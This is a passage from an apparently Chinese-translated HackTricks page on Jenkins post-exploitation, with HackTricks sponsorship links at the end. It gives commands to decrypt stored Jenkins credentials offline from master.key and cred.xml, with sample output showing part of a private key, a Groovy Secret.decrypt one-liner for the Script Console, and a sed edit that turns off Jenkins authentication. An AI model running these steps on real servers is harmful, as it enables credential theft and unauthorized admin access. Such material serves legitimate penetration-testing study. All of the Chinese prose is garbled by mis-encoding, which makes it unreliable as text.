å¦‚æœä½ å·²ç»è½¬å‚¨äº†**è§£å¯†å¯†ç æ‰€éœ€çš„å¯†ç **ï¼Œè¯·ä½¿ç”¨[**æ­¤è„šæœ¬**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **æ¥è§£å¯†è¿™äº›å¯†ç **ã€‚
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### ä»Groovyè§£å¯†Jenkinså¯†ç 

Jenkinsä½¿ç”¨åŠ å¯†çš„æ–¹å¼å­˜å‚¨æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å¯†ç å’Œå‡­è¯ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Groovyè„šæœ¬æ¥è§£å¯†è¿™äº›åŠ å¯†çš„å¯†ç ã€‚

ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹Groovyè„šæœ¬ï¼Œç”¨äºè§£å¯†Jenkinsä¸­çš„å¯†ç ï¼š

```groovy
import hudson.util.Secret

def secret = Secret.decrypt("<encrypted_password>")
println(secret.getPlainText())
```

åœ¨ä¸Šé¢çš„è„šæœ¬ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨`Secret.decrypt()`æ–¹æ³•æ¥è§£å¯†åŠ å¯†çš„å¯†ç ã€‚åªéœ€å°†`<encrypted_password>`æ›¿æ¢ä¸ºè¦è§£å¯†çš„å¯†ç å³å¯ã€‚

è¦æ‰§è¡Œæ­¤è„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨Jenkinsçš„Script Consoleã€‚åœ¨Jenkinsçš„ç®¡ç†ç•Œé¢ä¸­ï¼Œå¯¼èˆªåˆ°â€œManage Jenkinsâ€>â€œScript Consoleâ€ã€‚å°†è„šæœ¬ç²˜è´´åˆ°æ–‡æœ¬æ¡†ä¸­ï¼Œç„¶åç‚¹å‡»â€œRunâ€æŒ‰é’®ã€‚

æ‰§è¡Œè„šæœ¬åï¼Œå°†åœ¨æ§åˆ¶å°è¾“å‡ºä¸­çœ‹åˆ°è§£å¯†åçš„å¯†ç ã€‚

è¯·æ³¨æ„ï¼Œæ­¤æ–¹æ³•ä»…é€‚ç”¨äºJenkinsä¸­ä½¿ç”¨çš„åŠ å¯†å¯†ç ã€‚å¯¹äºå…¶ä»–ç±»å‹çš„åŠ å¯†å‡­è¯ï¼Œå¯èƒ½éœ€è¦ä½¿ç”¨ä¸åŒçš„æ–¹æ³•æ¥è§£å¯†ã€‚
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### åˆ›å»ºæ–°çš„ç®¡ç†å‘˜ç”¨æˆ·

1. è®¿é—®ä½äº `/var/lib/jenkins/config.xml` æˆ– `C:\Program Files (x86)\Jenkis\` çš„ Jenkins config.xml æ–‡ä»¶ã€‚
2. æœç´¢ `<useSecurity>true</useSecurity>` è¿™ä¸ªè¯ï¼Œå¹¶å°†å•è¯ **`true`** æ”¹ä¸º **`false`**ã€‚
3. è¿è¡Œå‘½ä»¤ `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`ã€‚
4. **é‡å¯** Jenkins æœåŠ¡å™¨ï¼š`service jenkins restart`ã€‚
5. ç°åœ¨å†æ¬¡è¿›å…¥ Jenkins é—¨æˆ·ï¼Œè¿™æ¬¡ Jenkins å°†ä¸ä¼šè¦æ±‚ä»»ä½•å‡­æ®ã€‚æ‚¨å¯ä»¥å¯¼èˆªåˆ° "**Manage Jenkins**" æ¥é‡æ–°è®¾ç½®ç®¡ç†å‘˜å¯†ç ã€‚
6. é€šè¿‡å°†è®¾ç½®æ›´æ”¹ä¸º `<useSecurity>true</useSecurity>` å¹¶**å†æ¬¡é‡å¯ Jenkins** æ¥**å¯ç”¨**å®‰å…¨æ€§ã€‚

## å‚è€ƒèµ„æ–™

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricksï¼Œè¯·æŸ¥çœ‹ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Šå…³æ³¨æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
